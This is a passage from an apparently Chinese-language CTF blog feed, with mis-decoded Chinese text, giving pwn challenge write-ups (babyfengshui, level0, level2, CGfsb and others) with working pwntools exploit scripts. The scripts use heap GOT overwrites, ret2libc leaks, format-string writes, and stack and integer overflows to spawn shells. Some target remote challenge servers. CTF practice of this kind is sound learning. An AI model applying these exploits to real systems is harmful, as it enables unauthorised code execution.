</p></blockquote><p>è¿™é¢˜è®¤è®¤çœŸçœŸçš„åˆ†æäº†ä¸€éæºä»£ç , åˆèŠ±äº†å°†è¿‘ä¸€å¤©çš„æ—¶é—´, æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥ä¼šè¿™ä¹ˆæ…¢</p><ol><li>é¦–å…ˆä»addå‡½æ•°ä¸­çœ‹å‡ºå­˜æ•°æ®çš„ç»“æ„ä½“æ˜¯é•¿è¿™ä¸ªæ ·å­çš„</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user</span>//æ€»å…±<span class="hljs-title">user_data</span>åŒºæœ‰0<span class="hljs-title">x80</span>å­—èŠ‚</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * description;<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">0x7c</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>â€‹    è€Œä¸”å…ˆmalloc descriptionçš„size(ç”¨æˆ·è¾“å…¥)å­—èŠ‚, ç„¶åå†malloc userçš„0x80å­—èŠ‚<br>2. deleteå’Œdisplayæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„, ç¨å¾®çœ‹ä¸€ä¸‹å°±å¯ä»¥çœ‹å‡ºaddä¸­countå˜é‡(å½“ç„¶æ˜¯è‡ªå·±æ”¹çš„åå­—)<br>3. ç„¶åupdateæœ‰ä¸ªå¾ˆè ¢çš„æ£€éªŒæ–¹æ³•, ä¸»è¦æ˜¯ä»–æƒ³ç€userå’Œdescriptionæ˜¯ç›¸é‚»çš„è€Œä¸”é¡ºåºä¹Ÿæ˜¯ä¸€æ ·çš„, è¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æ²¡æœ‰tcacheçš„glibcç‰ˆæœ¬æ¥ç»•è¿‡</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="hljs-keyword">char</span> *)*(&amp;ptr + a1) - <span class="hljs-number">4</span> )<br></code></pre></div></td></tr></table></figure><ol start="4"><li>å…ˆç”³è¯·ä¸‰ä¸ªchunk, ç¬¬ä¸‰ä¸ªå­˜â€/bin/shâ€</li><li>å°†free_got åœ°å€è¦†ç›–åœ¨chunk 1çš„descriptionæŒ‡é’ˆä¸Š, é€šè¿‡displayå‡½æ•°æ‰“å°å‡ºæ¥</li><li>é€šè¿‡LibcSearcheræ‰¾å‡ºsys_addr</li><li>æ”¹å†™chunk 1 çš„descriptionå†…å®¹ä¸ºsys_addr, å®é™…ä¸Šå°±æ˜¯æ”¹å†™free_gotä¸ºsys_addr</li><li>è°ƒç”¨delete(1)å³å¯</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#from pwn import *</span><br><span class="hljs-comment">#from LibcSearcher import *</span><br><span class="hljs-comment">#context.binary = &#x27;./babyfengshui_33c3_2016&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&quot;babyfengshui_33c3_2016&quot;</span>)<br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>free_plt = elf.plt[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-comment">#c = 0</span><br><span class="hljs-comment">#if c == 0:</span><br><span class="hljs-comment">#    p = remote(&quot;node4.buuoj.cn&quot;, 26834)</span><br><span class="hljs-comment">#else:</span><br><span class="hljs-comment">#    p = process(&quot;./babyfengshui_33c3_2016&quot;)</span><br><span class="hljs-comment">#</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,name,length,text</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">index,length,text</span>):</span><br><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">0x19c</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x198</span>+p32(free_got))<br><br>display(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>, free_addr)<br>base = free_addr - libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>system_addr = base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br><br>update(<span class="hljs-number">1</span>, <span class="hljs-number">0x8</span>, p32(system_addr))<br>delete(<span class="hljs-number">2</span>)<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="20-xdctf2015-pwn200"><a href="#20-xdctf2015-pwn200" class="headerlink" title="20.xdctf2015_pwn200"></a>20.xdctf2015_pwn200</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">libc = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;bof&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span><br>payload += flat([elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>write_addr = u32(rn(<span class="hljs-number">4</span>)[:])<br><br>base = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) <span class="hljs-comment">#å°±æ˜¯è¿™é‡Œåªèƒ½ç”¨bytesç±»å‹, å…¶ä»–æ²¡ä»€ä¹ˆå¯æ³¨æ„çš„äº†</span><br><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>, sys_addr, elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], binsh])<br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>sl(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="21-inndy-rop"><a href="#21-inndy-rop" class="headerlink" title="21.inndy_rop"></a>21.inndy_rop</h2><p>è¿™é¢˜éå¸¸ä¹‹ç›´æ¥, é™æ€é“¾æ¥+æ•°ç»„å®šä¹‰getså‡½æ•°, æ‘†æ˜äº†å°±æ˜¯åˆ©ç”¨ROP</p><p>ä½†æ˜¯ROPæ¯”è¾ƒé•¿, ç›´æ¥ä½¿ç”¨<code>ROPgadget --binary rop --ropchain</code>è®©å®ƒè‡ªåŠ¨ç”Ÿæˆexploit</p><p>å¤åˆ¶ç²˜è´´, ç„¶åå®Œäº‹äº†â€¦â€¦â€¦</p><p>å”¯ä¸€è¦æ³¨æ„çš„å°±æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„æ˜¯python2çš„è¯­æ³•, å¦‚æœæœ‰ä»€ä¹ˆstrç±»å‹çš„æ•°æ®è¦æŠŠä»–å˜æˆbytes</p><h2 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h2>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>Cè¯­è¨€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn: æ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºpwné¢˜è§£</title>
    <link href="/2021-07/pwn-start-ctf-pwn2/"/>
    <url>/2021-07/pwn-start-ctf-pwn2/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-æ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºpwné¢˜è§£"><a href="#pwn-æ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºpwné¢˜è§£" class="headerlink" title="pwn: æ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºpwné¢˜è§£"></a>pwn: æ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºpwné¢˜è§£</h1><p>Adworldçš„æ–°æ‰‹åŒºæ°´é¢˜è®°å½•ã€‚ </p><h2 id="1-get-shell"><a href="#1-get-shell" class="headerlink" title="1 get shell"></a>1 get shell</h2><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚ç›´æ¥remoteæˆ–è€…ncè¿ä¸Šå»å°±å¯ä»¥äº†ã€‚</p><h2 id="2-CGfsb"><a href="#2-CGfsb" class="headerlink" title="2 CGfsb"></a>2 CGfsb</h2><h3 id="2-1-checksec"><a href="#2-1-checksec" class="headerlink" title="2.1 checksec"></a>2.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/NLtTXI1s2VZxOgY.png" alt="1"></p><h3 id="2-2-æ‰¾æ¼æ´"><a href="#2-2-æ‰¾æ¼æ´" class="headerlink" title="2.2 æ‰¾æ¼æ´"></a>2.2 æ‰¾æ¼æ´</h3><p>IDAæ‰“å¼€mainå‡½æ•°ã€‚</p><p><img src="https://i.loli.net/2021/07/19/gftCLErnSAbqV7N.png" alt="2"></p><p>å¯ä»¥çœ‹å‡º<code>printf(&amp;s);</code>æ˜¯æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p>IDA mov ä»å³å¾€å·¦.</p><p>pwnmeçš„åœ°å€ï¼š0x804A068<img src="https://i.loli.net/2021/07/19/B41GJedNSzW7x2c.png" alt="image-20210716120017221" style="zoom:67%;" /> <strong>çœ‹æ¸…æ¥š, å‹å…¥çš„æ˜¯formatå­—ç¬¦ä¸²çš„åœ°å€!!</strong>.</p><p><img src="https://i.loli.net/2021/07/19/ylWdNF7t21mcRsY.png" alt="3"></p><h3 id="2-3-è„šæœ¬"><a href="#2-3-è„šæœ¬" class="headerlink" title="2.3 è„šæœ¬"></a>2.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#CGfsb.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = p32(<span class="hljs-number">0x804A068</span>) + <span class="hljs-string">&#x27;AAAA%10$n&#x27;</span> <span class="hljs-comment">#è¿™ä¸ª10æ˜¯è‡ªå·±è¯•å‡ºæ¥çš„</span><br><span class="hljs-comment">#payload = &#x27;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./CGfsb&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;please:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="3-when-did-you-born"><a href="#3-when-did-you-born" class="headerlink" title="3 when did you born"></a>3 when did you born</h2><h3 id="3-1-checksec"><a href="#3-1-checksec" class="headerlink" title="3.1 checksec"></a>3.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/m75TCOwzUhu4naY.png" alt="4"></p><h3 id="3-2-æ‰¾æ¼æ´"><a href="#3-2-æ‰¾æ¼æ´" class="headerlink" title="3.2 æ‰¾æ¼æ´"></a>3.2 æ‰¾æ¼æ´</h3><p>IDA64æ‰“å¼€ã€‚</p><img src="https://i.loli.net/2021/07/19/kiDx1ElBSs3a9QP.png" alt="5" style="zoom: 77%;" /><p>å¾ˆæ˜æ˜¾ï¼Œç¬¬ä¸€ä¸ªè¾“å…¥çš„æ•°å­—ä¸èƒ½æ˜¯1926ï¼ˆExcited!)</p><p>ç„¶åé€šè¿‡getsæŠŠä»–å˜æˆ1926ï¼ˆNaive!ï¼‰</p><h3 id="3-3-è„šæœ¬"><a href="#3-3-è„šæœ¬" class="headerlink" title="3.3 è„šæœ¬"></a>3.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#when_did_you_born.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span> + p32(<span class="hljs-number">1926</span>)<br>r = process(<span class="hljs-string">&#x27;./when_did_you_born&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Birth?\n&#x27;</span>,<span class="hljs-string">&#x27;1925&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Name?\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-hello-pwn"><a href="#4-hello-pwn" class="headerlink" title="4 hello pwn"></a>4 hello pwn</h2><h3 id="4-1-checksec"><a href="#4-1-checksec" class="headerlink" title="4.1 checksec"></a>4.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/xyLCbiM2sQ6OqnZ.png" alt="6"></p><h3 id="4-2-æ‰¾æ¼æ´"><a href="#4-2-æ‰¾æ¼æ´" class="headerlink" title="4.2 æ‰¾æ¼æ´"></a>4.2 æ‰¾æ¼æ´</h3><p><img src="https://i.loli.net/2021/07/19/F1EKL38tD4lCkjm.png" alt="7"></p><p>é€»è¾‘å¾ˆç®€å•ï¼Œåœ¨<code>unk_601068</code>è¯»å…¥ä¸€ä¸ªå€¼ï¼Œè®©<code>dword_60106c</code>å˜ä¸º<code>1853186401</code>å³å¯ã€‚</p><h3 id="4-3-è„šæœ¬"><a href="#4-3-è„šæœ¬" class="headerlink" title="4.3 è„šæœ¬"></a>4.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#hello_pen.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(<span class="hljs-number">1853186401</span>)<span class="hljs-comment">#-&gt;è½¬æ¢æˆ16è¿›åˆ¶å°±æ˜¯å…«ä½æ•°äº†, å¯ä»¥p32</span><br><br>r = process(<span class="hljs-string">&#x27;./hello_pwn&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;bof\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="5-level0"><a href="#5-level0" class="headerlink" title="5 level0"></a>5 level0</h2><h3 id="5-1-checksec"><a href="#5-1-checksec" class="headerlink" title="5.1 checksec"></a>5.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/Fiunr2gLte3zOqa.png" alt="8"></p><h3 id="5-2-æ‰¾æ¼æ´"><a href="#5-2-æ‰¾æ¼æ´" class="headerlink" title="5.2 æ‰¾æ¼æ´"></a>5.2 æ‰¾æ¼æ´</h3><img src="https://i.loli.net/2021/07/19/ZqmXBSlNDhP9MVu.png" alt="9" style="zoom:67%;" /><p>è¿™é‡Œå¥½åƒæœ‰ä¸ªä»€ä¹ˆä¸œè¥¿å˜›â€¦</p><h3 id="5-3-è„šæœ¬"><a href="#5-3-è„šæœ¬" class="headerlink" title="5.3 è„šæœ¬"></a>5.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#level0.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x400596</span>)<span class="hljs-comment">#callsystemçš„åœ°å€, ç®€å•çš„readæ ˆæº¢å‡º</span><br><span class="hljs-comment">#r = process(&#x27;./level0&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">45579</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;World\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="6-level2"><a href="#6-level2" class="headerlink" title="6 level2"></a>6 level2</h2><h3 id="6-1-checksec"><a href="#6-1-checksec" class="headerlink" title="6.1 checksec"></a>6.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/UkONFSAoqVgPyjB.png" alt="10"></p><h3 id="6-2-æ‰¾æ¼æ´"><a href="#6-2-æ‰¾æ¼æ´" class="headerlink" title="6.2 æ‰¾æ¼æ´"></a>6.2 æ‰¾æ¼æ´</h3><p>systemå‡½æ•°ï¼</p><img src="https://i.loli.net/2021/07/19/YKBlwLMFsot4xNy.png" alt="11" style="zoom:80%;" /><p>/bin/sh!</p><img src="https://i.loli.net/2021/07/19/dvgGrQhzkw87ZBP.png" alt="12" style="zoom:80%;" /><p>æº¢å‡ºåœ°å€0x8cï¼Œè¿”å›åœ°å€å¡«pltçš„systemåœ°å€ï¼Œå‚æ•°å¡«/bin/shçš„åœ°å€ã€‚å¥¥åˆ©ç»™ï¼</p><p>ps. ä¼šäº†æ‰çŸ¥é“ä¸ºä»€ä¹ˆæ´›ç¥ä¼šè¿™ä¹ˆç®€æ´â€¦..|à¥‚ï½¥Ï‰ï½¥` )</p><h3 id="6-3-è„šæœ¬"><a href="#6-3-è„šæœ¬" class="headerlink" title="6.3 è„šæœ¬"></a>6.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span> + p32(<span class="hljs-number">0x8048320</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>+ p32(<span class="hljs-number">0x804A024</span>) <span class="hljs-comment">#ç©º4å­—èŠ‚æ˜¯systemå‡½æ•°çš„è¿”å›åœ°å€</span><br><span class="hljs-comment">#r = remote(&#x27;111.198.29.45&#x27;,49960)</span><br>r = process(<span class="hljs-string">&quot;./level2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Input:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="7-guess-num"><a href="#7-guess-num" class="headerlink" title="7 guess num"></a>7 guess num</h2><h3 id="7-1-checksec"><a href="#7-1-checksec" class="headerlink" title="7.1 checksec"></a>7.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/uN6HcDVqr28J1ml.png" alt="13"></p><h3 id="7-2-æ‰¾æ¼æ´"><a href="#7-2-æ‰¾æ¼æ´" class="headerlink" title="7.2 æ‰¾æ¼æ´"></a>7.2 æ‰¾æ¼æ´</h3><p>çŒœæ•°å­—ï¼Œå…ˆç”Ÿæˆäº†ä¸ªéšæœºæ•°ï¼Œç„¶åçŒœ9æ¬¡ã€‚çŒœå¯¹äº†ç»™flagã€‚</p><img src="https://i.loli.net/2021/07/19/SNmUETKHkDqcroa.png" alt="14" style="zoom:80%;" /><p>å¾ˆæ˜¾ç„¶ï¼Œåªè¦é€šè¿‡getå‡½æ•°æŠŠéšæœºç§å­æ”¹æˆè‡ªå·±æƒ³è¦çš„å°±è¡Œäº†ã€‚</p><p>å…ˆå†™ä¸ªè„šæœ¬çœ‹çœ‹éšæœºç§å­æ˜¯0çš„æƒ…å†µï¼š</p><img src="https://i.loli.net/2021/07/19/YSh74wOVLI3KpTU.png" alt="15" style="zoom:80%;" /><p>å†™è„šæœ¬å§ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¸º0x30-0x10=0x20ã€‚åç§»å€¼åé¢åŠ ä¸ª0å°±è¡Œã€‚</p><h3 id="7-3-è„šæœ¬"><a href="#7-3-è„šæœ¬" class="headerlink" title="7.3 è„šæœ¬"></a>7.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>l = [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>* <span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0</span>)<br>r = process(<span class="hljs-string">&#x27;./guess_num&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br><span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> l:<br>r.sendlineafter(<span class="hljs-string">&#x27;number:&#x27;</span>,<span class="hljs-built_in">str</span>(each))<span class="hljs-comment">#sendlineafterçš„å‚æ•°å°±æ˜¯å­—ç¬¦ä¸²</span><br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="8-int-overflow"><a href="#8-int-overflow" class="headerlink" title="8 int overflow"></a>8 int overflow</h2><h3 id="8-1-checksec"><a href="#8-1-checksec" class="headerlink" title="8.1 checksec"></a>8.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/N6oXuSjhaAGOz4x.png" alt="16"></p><h3 id="8-2-æ‰¾æ¼æ´"><a href="#8-2-æ‰¾æ¼æ´" class="headerlink" title="8.2 æ‰¾æ¼æ´"></a>8.2 æ‰¾æ¼æ´</h3><img src="https://i.loli.net/2021/07/19/xEalQB5bc1ovGXy.png" alt="17" style="zoom:80%;" /><p>å…ˆè¿›è¿™ä¸ªå‡½æ•°ã€‚</p><p><img src="https://i.loli.net/2021/07/19/n82u3GmtfbsLcjk.png" alt="18"></p><p>æ˜¾è€Œæ˜“è§å˜›ã€‚(?)</p><p>å†è¿›check_passwd()</p><p><img src="https://i.loli.net/2021/07/19/MVbGalDqcB3miJp.png" alt="image-20210716122047227" style="zoom: 80%;" />å¯ä»¥çœ‹åˆ°__int8, åªæœ‰0-255, è€Œä¸”æœ‰è¦æ±‚å¯†ç é•¿4-8, æ‰€ä»¥å¯ä»¥æ•´æ•°æº¢å‡ºçš„åŠæ³•, bufé•¿512ä¹Ÿå¤Ÿäº†</p><h3 id="8-3-è„šæœ¬"><a href="#8-3-è„šæœ¬" class="headerlink" title="8.3 è„šæœ¬"></a>8.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>r = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">50645</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x0804868B</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">232</span><br>r.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">&quot;f**k&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;passwd:\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="9-cgpwn2"><a href="#9-cgpwn2" class="headerlink" title="9 cgpwn2"></a>9 cgpwn2</h2><h3 id="9-1-checksec"><a href="#9-1-checksec" class="headerlink" title="9.1 checksec"></a>9.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/dOLQ8A5XaRMDF47.png" alt="20"></p><h3 id="8-2-æ‰¾æ¼æ´-1"><a href="#8-2-æ‰¾æ¼æ´-1" class="headerlink" title="8.2 æ‰¾æ¼æ´"></a>8.2 æ‰¾æ¼æ´</h3><p><img src="https://i.loli.net/2021/07/19/KJQpnbUuq5aoPOl.png" alt="21"></p><p>æº¢å‡ºç‚¹è‚¯å®šå°±æ˜¯getså‡½æ•°å•¦ã€‚åç§»å€¼0x2Aã€‚<br>ä½†æ˜¯æˆ‘ä»¬éœ€è¦è‡ªå·±æ„é€ 